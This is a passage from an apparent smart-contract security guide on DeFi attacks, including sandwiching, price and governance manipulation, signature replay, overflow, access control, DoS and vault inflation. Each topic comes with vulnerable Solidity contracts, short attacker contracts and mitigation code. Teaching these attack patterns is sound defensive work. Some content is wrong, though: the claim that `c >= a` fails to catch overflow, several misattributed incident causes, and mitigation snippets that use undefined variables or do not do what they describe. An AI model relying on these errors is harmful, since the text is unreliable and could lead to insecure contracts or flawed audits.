        // 2. Execute victim's swap through signature/call
        // (Simulating victim's transaction)
        _executeVictimSwap(victim, victimAmount);

        // 3. Back-run swap
        _backRunSwap();
    }

    function _frontRunSwap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _backRunSwap() internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 balance = tokenB.balanceOf(address(this));
        router.swapExactTokensForTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _executeVictimSwap(address victim, uint256 amount) internal {
        // Execute victim's swap (victim loses value due to our sandwich)
    }
}
```

### Mitigation Strategies

1. **MEV-Protected RPC (Flashbots Protect)**
   ```solidity
   pragma solidity ^0.8.0;

   contract FlashbotsProtectedSwap {
       // Send transactions to Flashbots Protect RPC endpoint
       // https://relay.flashbots.net/

       function sandwichResistantSwap(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external {
           // Transaction is encrypted in mempool
           // Builders cannot see it to sandwich

           // Execute swap
           router.swapExactTokensForTokens(
               amountIn,
               minAmountOut,
               path,
               msg.sender,
               block.timestamp
           );
       }
   }
   ```

2. **Batch Clearing with Fair Pricing**
   ```solidity
   pragma solidity ^0.8.0;

   contract FairPricedBatch {
       struct Trade {
           address user;
           uint256 amountIn;
           uint256 minAmountOut;
       }

       Trade[] public batch;
       uint256 public batchSize = 50;

       function submitTrade(uint256 amountIn, uint256 minAmountOut) external {
           batch.push(Trade(msg.sender, amountIn, minAmountOut));

           if (batch.length >= batchSize) {
               clearBatch();
           }
       }

       function clearBatch() internal {
           // All trades execute at SAME price - prevents sandwich
           // Calculate single clearing price for all

           uint256 totalIn = 0;
           for (uint256 i = 0; i < batch.length; i++) {
               totalIn += batch[i].amountIn;
           }

           uint256 totalOut = getOutputForAmount(totalIn);
           uint256 clearingPrice = totalOut / totalIn;

           // Execute all trades at clearing price
           for (uint256 i = 0; i < batch.length; i++) {
               uint256 userOut = (batch[i].amountIn * clearingPrice) / 1e18;
               require(userOut >= batch[i].minAmountOut);
               transfer(batch[i].user, userOut);
           }

           delete batch;
       }
   }
   ```

3. **Encrypted Transactions (Dark Pool Style)**
   ```solidity
   pragma solidity ^0.8.0;

   contract DarkPoolSwap {
       bytes32[] public encryptedOrders;

       function submitEncryptedOrder(
           bytes32 encryptedData,
           bytes32 commitment
       ) external {
           encryptedOrders.push(encryptedData);
           // Store commitment for verification
       }

       function revealAndExecute(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path,
           bytes32 randomness
       ) external {
           // Reveal orders only when committing to execution
           // Prevents MEV extraction through observation

           // Execute swap with verified random ordering
           _executeSwapWithRandomization(amountIn, minAmountOut, path);
       }
   }
   ```

### Detection Methods

- Monitor for transaction pairs with similar parameters
- Track price impacts and spreads
- Analyze transaction ordering in blocks
- Monitor MEV dashboards
- Look for rapid buy/sell sequences
- Verify slippage patterns

---

## Price Manipulation

### How It Works

Attackers artificially move asset prices to profit:
- Pump prices then sell
- Dump prices then buy
- Exploit price-based liquidations
- Manipulate collateral values

### Real-World Examples

- **Luna-Terra Collapse**: Billions from price manipulation
- **Squid Game Rug Pull**: Pump-and-dump attack
- **Titan Token**: $40 million from death spiral
- **Iron Finance**: Algorithmic stablecoin collapse

### Code Examples

#### Pump and Dump Attack

```solidity
// VULNERABLE: Price-dependent logic
pragma solidity ^0.8.0;

contract VulnerableToken {
    uint256 public price;
    mapping(address => uint256) public balances;

    function updatePrice(uint256 newPrice) external {
        price = newPrice; // Any external caller can update
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender] * price; // Inflatable value
    }
}

contract PumpAndDumpAttacker {
    VulnerableToken public token;
    uint256 public initialInvestment = 100 ether;

    function attack() external {
        // Step 1: Pump the price
        token.updatePrice(1000e18); // Increase price 10x

        // Step 2: Contracts using token.price() now think tokens are valuable
        // Users buy in at inflated price

        // Step 3: Attacker dumps
        token.updatePrice(1e18); // Back to real price

        // Step 4: Profit from price difference
    }
}
```

#### Price-Based Liquidation Exploitation

```solidity
// VULNERABLE: Liquidation based on manipulable price
pragma solidity ^0.8.0;

contract VulnerableLendingPool {
    IPriceOracle public oracle;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;

    function liquidate(address borrower) external {
        uint256 collateralValue = (collateral[borrower] * oracle.getPrice()) / 1e18;
        uint256 borrowedValue = borrowed[borrower];

        if (collateralValue < borrowedValue) {
            // VULNERABILITY: Price is manipulated, liquidation unfair
            _seizeCollateral(borrower);
        }
    }
}

contract PriceLiquidationAttacker {
    VulnerableLendingPool public pool;
    IPriceOracle public oracle;

    function exploitLiquidation(address victim) external {
        // Step 1: Attacker manipulates price down
        oracle.setPrice(1); // Crash price

        // Step 2: Victim becomes liquidatable
        pool.liquidate(victim);

        // Step 3: Attacker buys victim's collateral at discount

        // Step 4: Restore price, sell for profit
    }
}
```

### Mitigation Strategies

1. **Robust Price Feeds**
   ```solidity
   pragma solidity ^0.8.0;

   contract RobustOracle {
       AggregatorV3Interface public chainlink;
       IUniswapV2Pair public uniswap;
       IBandOracle public band;

       function getSafePrice() external view returns (uint256) {
           uint256 clPrice = getChainlinkPrice();
           uint256 uniPrice = getUniswapTWAP();
           uint256 bandPrice = getBandPrice();

           // Verify prices are consistent
           _validatePriceConsistency(clPrice, uniPrice, bandPrice);

           return _median(clPrice, uniPrice, bandPrice);
       }

       function _validatePriceConsistency(
           uint256 a, uint256 b, uint256 c
       ) internal pure {
           uint256 max = _max(a, _max(b, c));
           uint256 min = _min(a, _min(b, c));

           // Prices shouldn't diverge more than 5%
           require(max <= min * 105 / 100, "Price divergence");
       }

       function _median(uint256 a, uint256 b, uint256 c)
           internal pure returns (uint256) {
           if (a >= b) {
               if (b >= c) return b;
               if (a >= c) return c;
               return a;
           } else {
               if (a >= c) return a;
               if (b >= c) return c;
               return b;
           }
       }
   }
   ```

2. **Circuit Breakers**
   ```solidity
   pragma solidity ^0.8.0;

   contract CircuitBreakerProtection {
       uint256 public lastPrice;
       uint256 public maxPriceChange = 100; // 1% max change per block
       uint256 public lastUpdateBlock;

       function updatePrice(uint256 newPrice) external {
           require(block.number > lastUpdateBlock, "Already updated this block");

           if (lastPrice > 0) {
               uint256 percentChange = (newPrice * 10000) / lastPrice;
               require(
                   percentChange >= 9900 && percentChange <= 10100,
                   "Price change too large"
               );
           }

           lastPrice = newPrice;
           lastUpdateBlock = block.number;
       }
   }
   ```

3. **Liquidation Safeguards**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeLiquidation {
       function liquidate(address borrower) external {
           require(isLiquidatable(borrower), "Not liquidatable");

           // Get price from multiple sources
           uint256 price = getSafePrice();

           // Check liquidation threshold with buffer
           uint256 healthFactor = getHealthFactor(borrower, price);
           require(healthFactor < 95, "Health factor too high"); // 95% = 5% buffer

           // Liquidate gradually to prevent cascade
           _liquidatePortion(borrower);
       }
   }
   ```

---

## Governance Attacks

### How It Works

Attackers exploit governance mechanisms to drain funds or take over protocols:
- Flash loan voting attacks
- Vote buying
- Governance token dilution
- Proposal manipulation
- Instant finality exploitation

### Real-World Examples

- **bZx Governance Attack**: $150,000 through voting exploit
- **Curve DAO Attack**: Governance token voting power manipulation
- **Binance Bridge Hack**: Governance vulnerability led to $600M loss
- **Compound Governance Exploit**: Flash loan voting attack

### Code Examples

#### Flash Loan Voting Attack

```solidity
// VULNERABLE: Voting power from token balance
pragma solidity ^0.8.0;

interface IGovernanceToken is IERC20 {
    function getPriorVotes(address account, uint256 blockNumber)
        external view returns (uint96);
}

contract VulnerableGovernance {
    IGovernanceToken public govToken;

    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;

    struct Proposal {
        uint256 forVotes;
        uint256 againstVotes;
        bool executed;
    }

    function castVote(uint256 proposalId, bool support) external {
        // VULNERABILITY: Uses current block balance for voting
        uint256 votes = govToken.balanceOf(msg.sender);

        if (support) {
            proposals[proposalId].forVotes += votes;
        } else {
            proposals[proposalId].againstVotes += votes;
        }
    }

    function executeProposal(uint256 proposalId) external {
        require(proposals[proposalId].forVotes > proposals[proposalId].againstVotes);
        proposals[proposalId].executed = true;

        // Transfer funds to attacker's proposal
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}

// Flash loan voting attack
contract FlashLoanVotingAttack {
    VulnerableGovernance public governance;
    IFlashLoanProvider public flashloan;
    IGovernanceToken public govToken;

    function executeAttack() external {
        // Step 1: Borrow governance tokens via flashloan
        flashloan.flashLoan(
            address(this),
            address(govToken),
            govToken.totalSupply() / 2, // Borrow half total supply
            abi.encode(address(governance))
        );
    }

    function executeOperation(
        address,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata params
    ) external override returns (bytes32) {
        address governanceAddress = abi.decode(params, (address));
        VulnerableGovernance gov = VulnerableGovernance(governanceAddress);

        // Step 2: Vote with borrowed tokens
        gov.castVote(0, true); // Vote yes on attacker's proposal

        // Step 3: Execute proposal while still holding tokens
        gov.executeProposal(0); // Transfer funds to attacker

        // Step 4: Repay flashloan
        govToken.approve(msg.sender, amount + premium);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

#### Vote Buying Attack

```solidity
// VULNERABLE: No snapshot of voting power
pragma solidity ^0.8.0;

contract VulnerableVotingPool {
    mapping(uint256 => uint256) public proposalVotes;
    mapping(address => uint256) public userTokens;

    function deposit(uint256 amount) external {
        userTokens[msg.sender] += amount;
        // No snapshot taken
    }

    function vote(uint256 proposalId, uint256 amount) external {
        // VULNERABILITY: Uses current balance, can be manipulated
        require(userTokens[msg.sender] >= amount);
        proposalVotes[proposalId] += amount;
    }

    function withdraw(uint256 amount) external {
        require(userTokens[msg.sender] >= amount);
        userTokens[msg.sender] -= amount;
        // Can withdraw after voting!
    }
}

// Vote buying attack
contract VoteBuyingAttack {
    VulnerableVotingPool public pool;

    function attack() external {
        // Step 1: Deposit tokens
        pool.deposit(1000e18);

        // Step 2: Vote on malicious proposal
        pool.vote(0, 1000e18);

        // Step 3: Immediately withdraw tokens
        pool.withdraw(1000e18);

        // Tokens can be used again in next governance cycle!
    }
}
```

### Mitigation Strategies

1. **Block Number Snapshots**
   ```solidity
   pragma solidity ^0.8.0;

   contract SecureGovernance {
       struct Proposal {
           uint256 startBlock;
           uint256 endBlock;
           uint256 forVotes;
           uint256 againstVotes;
           bool executed;
       }

       mapping(uint256 => Proposal) public proposals;
       mapping(uint256 => mapping(address => bool)) public hasVoted;

       IGovernanceToken public govToken;

       function propose() external returns (uint256) {
           uint256 proposalId = proposalCount++;
           proposals[proposalId].startBlock = block.number + 1;
           proposals[proposalId].endBlock = block.number + 50000; // ~1 week
           return proposalId;
       }

       function castVote(uint256 proposalId, bool support) external {
           require(!hasVoted[proposalId][msg.sender], "Already voted");
           require(block.number <= proposals[proposalId].endBlock, "Voting closed");

           // Use block number snapshot - can't be manipulated
           uint256 votes = govToken.getPriorVotes(
               msg.sender,
               proposals[proposalId].startBlock
           );

           hasVoted[proposalId][msg.sender] = true;

           if (support) {
               proposals[proposalId].forVotes += votes;
           } else {
               proposals[proposalId].againstVotes += votes;
           }
       }
   }
   ```

2. **Time-Locks on Execution**
   ```solidity
   pragma solidity ^0.8.0;

   contract TimeLockGovernance {
       uint256 constant TIMELOCK = 2 days;

       struct ScheduledAction {
           address target;
           bytes data;
           uint256 scheduledTime;
           bool executed;
       }

       mapping(bytes32 => ScheduledAction) public scheduledActions;

       function scheduleProposal(
           address target,
           bytes calldata data
       ) external onlyGovernance {
           bytes32 actionId = keccak256(abi.encodePacked(target, data));

           scheduledActions[actionId].target = target;
           scheduledActions[actionId].data = data;
           scheduledActions[actionId].scheduledTime = block.timestamp + TIMELOCK;
       }

       function executeProposal(bytes32 actionId) external {
           ScheduledAction storage action = scheduledActions[actionId];

           require(block.timestamp >= action.scheduledTime, "Timelock not passed");
           require(!action.executed, "Already executed");

           action.executed = true;

           (bool success, ) = action.target.call(action.data);
           require(success);
       }
   }
   ```

3. **Multi-Sig Oversight**
   ```solidity
   pragma solidity ^0.8.0;

   contract GovernanceWithMultisig {
       address[] public multisigOwners;
       uint256 public multisigThreshold;

       function executeProposal(bytes32 proposalId, bytes calldata data)
           external
           onlyGovernance
       {
           // Proposal must be approved by multisig before execution
           require(
               _hasMultisigApproval(proposalId),
               "Multisig approval required"
           );

           // Execute proposal
           (bool success, ) = address(this).call(data);
           require(success);
       }

       function _hasMultisigApproval(bytes32 proposalId)
           internal view returns (bool)
       {
           uint256 approvals = 0;
           for (uint256 i = 0; i < multisigOwners.length; i++) {
               if (isApprovedBy[proposalId][multisigOwners[i]]) {
                   approvals++;
               }
           }
           return approvals >= multisigThreshold;
       }
   }
   ```

---

## Signature Replay

### How It Works

Attackers reuse valid signatures to execute transactions multiple times:
- Same network replay
- Cross-chain replay
- Signature reuse across different functions

### Real-World Examples

- **Poly Network Hack**: Cross-chain signature replay ($611M)
- **Ronin Bridge**: Signature validation bypass ($625M)
- **Nomad Bridge**: Missing chain ID check ($190M)
- **EIP-712 replay attacks**: Various DeFi protocols

### Code Examples

#### Vulnerable Signature (No Nonce)

```solidity
// VULNERABLE: No nonce protection
pragma solidity ^0.8.0;

contract VulnerablePermit {
    mapping(address => uint256) public balances;

    // VULNERABILITY: No nonce, signature can be replayed
    function permitTransfer(
        address from,
        address to,
        uint256 amount,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(
            abi.encodePacked(from, to, amount)
        );

        address signer = recoverSigner(hash, signature);
        require(signer == from, "Invalid signature");

        balances[from] -= amount;
        balances[to] += amount;
    }

    function recoverSigner(bytes32 hash, bytes calldata sig)
        internal pure returns (address)
    {
        // Signature recovery logic
        return msg.sender; // Simplified
    }
}

// Attacker replays signature multiple times
contract SignatureReplayAttacker {
    VulnerablePermit public token;

    function replaySignature(
        address from,
        address to,
        uint256 amount,
        bytes calldata signature
    ) external {
        // Can call permitTransfer multiple times with same signature!
        for (uint256 i = 0; i < 10; i++) {
            token.permitTransfer(from, to, amount, signature);
        }
    }
}
```

#### Cross-Chain Replay

```solidity
// VULNERABLE: No chain ID check
pragma solidity ^0.8.0;

contract VulnerableCrossChain {
    mapping(address => uint256) public nonces;

    // VULNERABILITY: Missing chainId in signature
    function executeTransaction(
        address target,
        bytes calldata data,
        uint256 nonce,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(
            abi.encodePacked(target, data, nonce)
        );

        address signer = recoverSigner(hash, signature);
        require(nonces[signer] == nonce, "Invalid nonce");

        nonces[signer]++;

        (bool success, ) = target.call(data);
        require(success);
    }
}

// Cross-chain replay attack
contract CrossChainReplayAttack {
    address public mainnetContract;
    address public arbitrumContract;

    function replayAcrossChains(
        address target,
        bytes calldata data,
        uint256 nonce,
        bytes calldata signature
    ) external {
        // Same signature works on both chains!
        // Call on Arbitrum with signature meant for Mainnet
        IVulnerableCrossChain(arbitrumContract).executeTransaction(
            target, data, nonce, signature
        );
    }
}
```

### Mitigation Strategies

1. **Nonce-Based Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafePermit {
       mapping(address => uint256) public nonces;
       mapping(address => uint256) public balances;

       function permit(
           address owner,
           address spender,
           uint256 value,
           uint256 deadline,
           uint8 v,
           bytes32 r,
           bytes32 s
       ) external {
           require(block.timestamp <= deadline, "Signature expired");

           bytes32 digest = keccak256(
               abi.encodePacked(
                   "\x19\x01",
                   DOMAIN_SEPARATOR,
                   keccak256(
                       abi.encode(
                           PERMIT_TYPEHASH,
                           owner,
                           spender,
                           value,
                           nonces[owner]++, // Increment nonce
                           deadline
                       )
                   )
               )
           );

           address recoveredAddress = ecrecover(digest, v, r, s);
           require(recoveredAddress == owner, "Invalid signature");

           // Execute permit
       }
   }
   ```

2. **Chain ID in Signature**
   ```solidity
   pragma solidity ^0.8.0;

   contract ChainIDProtection {
       bytes32 public DOMAIN_SEPARATOR;

       constructor() {
           DOMAIN_SEPARATOR = keccak256(
               abi.encode(
                   keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                   keccak256(bytes("MyToken")),
                   keccak256(bytes("1")),
                   block.chainid, // Include chain ID
                   address(this)
               )
           );
       }

       function executeTransaction(
           address target,
           bytes calldata data,
           uint256 nonce,
           uint8 v,
           bytes32 r,
           bytes32 s
       ) external {
           bytes32 digest = keccak256(
               abi.encodePacked(
                   "\x19\x01",
                   DOMAIN_SEPARATOR, // Includes chainId
                   keccak256(abi.encode(target, data, nonce))
               )
           );

           address signer = ecrecover(digest, v, r, s);
           require(signer == msg.sender);

           (bool success, ) = target.call(data);
           require(success);
       }
   }
   ```

3. **Signature Expiration**
   ```solidity
   pragma solidity ^0.8.0;

   contract ExpiringSignature {
       mapping(bytes32 => bool) public usedSignatures;

       function executeWithExpiry(
           address target,
           bytes calldata data,
           uint256 deadline,
           bytes calldata signature
       ) external {
           require(block.timestamp <= deadline, "Signature expired");

           bytes32 hash = keccak256(
               abi.encodePacked(target, data, deadline)
           );

           require(!usedSignatures[hash], "Signature already used");
           usedSignatures[hash] = true;

           // Execute
       }
   }
   ```

---

## Integer Overflow/Underflow

### How It Works

In Solidity < 0.8.0, arithmetic operations could overflow/underflow silently. Attackers:
- Cause balances to wrap around
- Create infinite token supplies
- Drain contracts through bad math

### Real-World Examples

- **bEthereum Contract**: Integer overflow drained $225,000
- **PoWHC Ponzi**: Integer overflow vulnerability
- **SmartBillions Casino**: Integer underflow exploitation

### Code Examples

#### Vulnerable Arithmetic (Solidity < 0.8.0)

```solidity
// VULNERABLE: No overflow protection (Solidity 0.7.0 and below)
pragma solidity ^0.7.0;

contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount);

        balances[msg.sender] -= amount; // Could underflow
        balances[to] += amount;          // Could overflow
    }

    function mint(uint256 amount) external {
        balances[msg.sender] += amount;
        totalSupply += amount;           // Could overflow
    }
}

// Attack
contract OverflowAttacker {
    VulnerableToken public token;

    function attack() external {
        // Send 1 token to someone
        token.transfer(address(this), 1);

        // Check balance - if user had 0, now has huge number!
        // 0 - 1 = 2^256 - 1 (max uint256)
    }
}
```

#### Unsafe SafeMath

```solidity
// VULNERABLE: Incorrect SafeMath implementation
pragma solidity ^0.8.0;

contract UnsafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Overflow"); // WRONG - this doesn't catch overflow!
        return c;
    }
}
```

### Mitigation Strategies

1. **Solidity 0.8.0+ (Built-in Overflow Protection)**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeToken {
       mapping(address => uint256) public balances;

       function transfer(address to, uint256 amount) external {
           require(balances[msg.sender] >= amount);

           // Automatic overflow/underflow checks in 0.8.0+
           balances[msg.sender] -= amount;
           balances[to] += amount;
       }
   }
   ```

2. **OpenZeppelin SafeMath (for 0.7.0 and below)**
   ```solidity
   pragma solidity ^0.7.0;

   import "@openzeppelin/contracts/math/SafeMath.sol";

   contract SafeToken {
       using SafeMath for uint256;
       mapping(address => uint256) public balances;

       function transfer(address to, uint256 amount) external {
           require(balances[msg.sender] >= amount);

           balances[msg.sender] = balances[msg.sender].sub(amount);
           balances[to] = balances[to].add(amount);
       }
   }
   ```

3. **Explicit Checks**
   ```solidity
   pragma solidity ^0.8.0;

   contract ExplicitChecks {
       function add(uint256 a, uint256 b) internal pure returns (uint256) {
           require(a + b >= a, "Overflow");
           return a + b;
       }

       function sub(uint256 a, uint256 b) internal pure returns (uint256) {
           require(b <= a, "Underflow");
           return a - b;
       }
   }
   ```

---

## Access Control Exploits

### How It Works

Weak access control allows unauthorized users to perform privileged functions:
- Missing permission checks
- Incorrectly implemented role-based access
- tx.origin usage instead of msg.sender
- Public functions should be internal

### Real-World Examples

- **Ronin Bridge**: Compromised private keys for validators
- **Cream Finance**: Permissioned function called by attacker
- **Compound Governor Bravo**: Votable proposal threshold bypass
- **Wormhole Bridge**: Validation bypass ($325M)

### Code Examples

#### Missing Access Control

```solidity
// VULNERABLE: No access control
pragma solidity ^0.8.0;

contract VulnerableVault {
    uint256 public totalSupply;
    mapping(address => uint256) public balances;

    // VULNERABILITY: Anyone can mint!
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        totalSupply += amount;
    }

    // VULNERABILITY: Anyone can withdraw all funds!
    function withdrawAll() external {
        uint256 balance = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success);
    }
}

// Attacker
contract AccessControlAttacker {
    VulnerableVault public vault;

    function attack() external {
        // Mint infinite tokens
        vault.mint(address(this), 1000000e18);

        // Withdraw all vault funds
        vault.withdrawAll();
    }
}
```

#### Incorrect Role-Based Access

```solidity
// VULNERABLE: Incorrect role checking
pragma solidity ^0.8.0;

contract VulnerableRoleControl {
    bytes32 constant ADMIN_ROLE = keccak256("ADMIN");
    mapping(address => mapping(bytes32 => bool)) public roles;

    // VULNERABILITY: No check of sender's role
    function grantRole(bytes32 role, address account) external {
        // Should check: require(roles[msg.sender][ADMIN_ROLE]);
        roles[account][role] = true;
    }

    function withdrawFunds() external {
        // Anyone can withdraw!
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}
```

#### tx.origin Usage

```solidity
// VULNERABLE: Uses tx.origin instead of msg.sender
pragma solidity ^0.8.0;

contract VulnerableTxOrigin {
    mapping(address => uint256) public balances;

    // VULNERABILITY: Uses tx.origin for authorization
    function withdraw(uint256 amount) external {
        require(tx.origin == owner, "Not owner"); // WRONG!

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}

// Phishing attack
contract PhishingContract {
    VulnerableTxOrigin public vault;

    receive() external payable {
        // When owner calls vault.withdraw(), tx.origin is the owner
        // But msg.sender is this contract
        // So this contract can steal funds!
        vault.withdraw(address(this).balance);
    }
}
```

### Mitigation Strategies

1. **OpenZeppelin AccessControl**
   ```solidity
   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/access/AccessControl.sol";

   contract SafeVault is AccessControl {
       bytes32 public constant ADMIN_ROLE = keccak256("ADMIN");
       bytes32 public constant MINTER_ROLE = keccak256("MINTER");

       constructor() {
           _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
       }

       function mint(address to, uint256 amount)
           external
           onlyRole(MINTER_ROLE)
       {
           // Protected by role-based access
           balances[to] += amount;
       }

       function withdrawFunds()
           external
           onlyRole(ADMIN_ROLE)
       {
           // Only admin can call
           (bool success, ) = msg.sender.call{value: address(this).balance}("");
           require(success);
       }
   }
   ```

2. **Owner-Based Access**
   ```solidity
   pragma solidity ^0.8.0;

   contract OwnerProtected {
       address public owner;

       modifier onlyOwner() {
           require(msg.sender == owner, "Not owner");
           _;
       }

       constructor() {
           owner = msg.sender;
       }

       function restrictedFunction() external onlyOwner {
           // Only owner can call
       }

       function transferOwnership(address newOwner) external onlyOwner {
           owner = newOwner;
       }
   }
   ```

3. **Use msg.sender, Not tx.origin**
   ```solidity
   pragma solidity ^0.8.0;

   contract ProperSenderCheck {
       mapping(address => uint256) public balances;
       address public owner;

       function withdraw(uint256 amount) external {
           // CORRECT: Use msg.sender
           require(msg.sender == owner);

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }

       // WRONG - don't do this:
       // require(tx.origin == owner);
   }
   ```

---

## Denial of Service (DoS)

### How It Works

Attackers prevent contract functionality by:
- Reverting operations with carefully crafted inputs
- Consuming excessive gas
- Blocking functions with loops over unbounded arrays
- Exploitation of gas limits

### Real-World Examples

- **Ethereum 2.0 Deposit Contract**: Possible DoS vectors
- **Multiple AMM Contracts**: DoS via gas exhaustion
- **DEX Liquidity Pools**: Array iteration DoS

### Code Examples

#### Array Iteration DoS

```solidity
// VULNERABLE: Unbounded loop can run out of gas
pragma solidity ^0.8.0;

contract VulnerableDistribution {
    address[] public recipients;
    uint256 public distributionAmount;

    // VULNERABILITY: Adding to array without limit
    function addRecipient(address addr) external {
        recipients.push(addr);
    }

    // VULNERABILITY: Iterating over unbounded array
    function distribute() external {
        for (uint256 i = 0; i < recipients.length; i++) {
            (bool success, ) = recipients[i].call{
                value: distributionAmount
            }("");
            require(success);
        }
    }
}

// DoS attack
contract DoSAttacker {
    VulnerableDistribution public distrib;

    function attack() external {
        // Add millions of addresses
        for (uint256 i = 0; i < 10000; i++) {
            distrib.addRecipient(address(uint160(i)));
        }

        // Now distribute() will always run out of gas
        // No one can receive their tokens!
    }
}
```

#### Reverting External Call DoS

```solidity
// VULNERABLE: External call revert stops entire operation
pragma solidity ^0.8.0;

contract VulnerableWithdrawal {
    mapping(address => uint256) public balances;
    address[] public withdrawalQueue;

    function queueWithdrawal(address addr) external {
        withdrawalQueue.push(addr);
    }

    // VULNERABILITY: If any call reverts, entire tx reverts
    function processWithdrawals() external {
        for (uint256 i = 0; i < withdrawalQueue.length; i++) {
            uint256 amount = balances[withdrawalQueue[i]];
            balances[withdrawalQueue[i]] = 0;

            // If this reverts, all withdrawals fail
            (bool success, ) = withdrawalQueue[i].call{value: amount}("");
            require(success); // Blocks all withdrawals!
        }
    }
}

// DoS contract
contract DoSBlocker {
    receive() external payable {
        revert("Blocked!"); // Always revert
    }
}

// Attack
contract DoSAttackOrchestration {
    VulnerableWithdrawal public vault;
    DoSBlocker public blocker;

    function attack() external {
        // Queue the DoS blocker
        vault.queueWithdrawal(address(blocker));

        // Now processWithdrawals() will always fail
        // No one can withdraw!
    }
}
```

#### Expensive Operation DoS

```solidity
// VULNERABLE: External call that uses excessive gas
pragma solidity ^0.8.0;

contract ExpensiveOperation {
    uint256[] public data;

    function addData(uint256 x) external {
        data.push(x);
    }

    // VULNERABILITY: This gets more expensive as array grows
    function process() external {
        // If array has millions of elements, this costs billions of gas
        for (uint256 i = 0; i < data.length; i++) {
            data[i] *= 2;
        }
    }
}
```

### Mitigation Strategies

1. **Bounded Iteration with Pagination**
   ```solidity
   pragma solidity ^0.8.0;

   contract PaginatedDistribution {
       address[] public recipients;
       uint256 public distributionAmount;
       uint256 constant MAX_ITERATION = 100;

       function distribute(uint256 startIndex, uint256 endIndex) external {
           require(endIndex <= recipients.length);
           require(endIndex - startIndex <= MAX_ITERATION, "Too many iterations");

           for (uint256 i = startIndex; i < endIndex; i++) {
               (bool success, ) = recipients[i].call{
                   value: distributionAmount
               }("");
               // Don't revert if individual call fails
               // emit WithdrawalFailed(recipients[i]);
           }
       }
   }
   ```

2. **Graceful Revert Handling**
   ```solidity
   pragma solidity ^0.8.0;

   contract RobustWithdrawal {
       mapping(address => uint256) public balances;

       function withdraw(uint256 amount) external {
           require(balances[msg.sender] >= amount);
           balances[msg.sender] -= amount;

           // Use low-level call to prevent revert from blocking
           (bool success, ) = msg.sender.call{value: amount}("");

           if (!success) {
               // Instead of reverting, queue for later
               pendingWithdrawals[msg.sender] += amount;
               emit WithdrawalQueued(msg.sender, amount);
           }
       }

       function claimQueued() external {
           uint256 amount = pendingWithdrawals[msg.sender];
           pendingWithdrawals[msg.sender] = 0;
           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

3. **Pull over Push Pattern**
   ```solidity
   pragma solidity ^0.8.0;

   contract PullPattern {
       mapping(address => uint256) public balances;

       // Instead of pushing funds to users (which can fail)
       // Let users pull their funds

       function withdraw() external {
           uint256 amount = balances[msg.sender];
           balances[msg.sender] = 0;

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

4. **Limit Array Sizes**
   ```solidity
   pragma solidity ^0.8.0;

   contract ArraySizeLimited {
       address[] public recipients;
       uint256 constant MAX_RECIPIENTS = 1000;

       function addRecipient(address addr) external {
           require(recipients.length < MAX_RECIPIENTS, "Too many recipients");
           recipients.push(addr);
       }
   }
   ```

---

## Vault Inflation Attacks

### How It Works

Attackers inflate share prices by donating tokens directly to vault, causing rounding errors:
1. Attacker donates tokens directly to vault (not via deposit)
2. Shares are worth more relative to vault assets
3. Early users get fewer shares for their deposit
4. Attacker exits with profit

### Real-World Examples

- **Balancer Exploit**: $500,000 via inflation attack
- **Yearn Finance Vault**: Share price manipulation
- **Curve Metapool**: Vault inflation issue
- **Reentrancy + Inflation**: Combined attacks

### Code Examples

#### Vulnerable Vault

```solidity
// VULNERABLE: Share price inflation attack
pragma solidity ^0.8.0;

contract VulnerableVault {
    IERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function deposit(uint256 assets) external returns (uint256 shares) {
        // VULNERABILITY: Uses simple division (shares = assets)
        // Can be manipulated by direct transfers

        if (totalSupply == 0) {
            shares = assets; // 1:1 ratio at start
        } else {
            // VULNERABILITY: Division can be manipulated
            shares = (assets * totalSupply) / asset.balanceOf(address(this));
        }

        require(shares > 0, "Zero shares");

        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        assets = (shares * asset.balanceOf(address(this))) / totalSupply;

        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;

        asset.transfer(msg.sender, assets);
    }
}

// Inflation attack
contract InflationAttacker {
    VulnerableVault public vault;
    IERC20 public asset;

    function attack() external {
        // Step 1: Deposit 1 wei to get 1 share
        asset.approve(address(vault), 1);
        vault.deposit(1);

        // Step 2: Donate 1000 tokens directly (inflates share price)
        asset.transfer(address(vault), 1000e18);

        // Now 1 share is worth 1000 tokens!

        // Step 3: Victim deposits 1000 tokens
        // Gets (1000 * 1) / 1000001 = 0 shares (rounding down!)

        // Step 4: Attacker withdraws
